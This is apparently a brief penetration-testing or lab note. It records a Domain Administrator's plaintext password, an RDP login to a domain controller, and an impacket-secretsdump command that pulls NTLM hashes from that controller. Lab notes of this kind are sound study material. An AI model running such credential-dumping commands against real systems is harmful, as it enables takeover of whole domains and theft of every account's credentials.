- User `stom `is Domain Administrator :
	- `stom`: `calves-warp-learning1`

# Login to DC
---
- `xfreerdp3  /v:172.16.119.11 /u:stom /p:'calves-warp-learning1'`

# Secrets Dump
---
- `impacket-secretsdump 'stom':'calves-warp-learning1'@172.16.119.11 -just-dc-ntlm`
![[Pasted image 20250706214511.png]]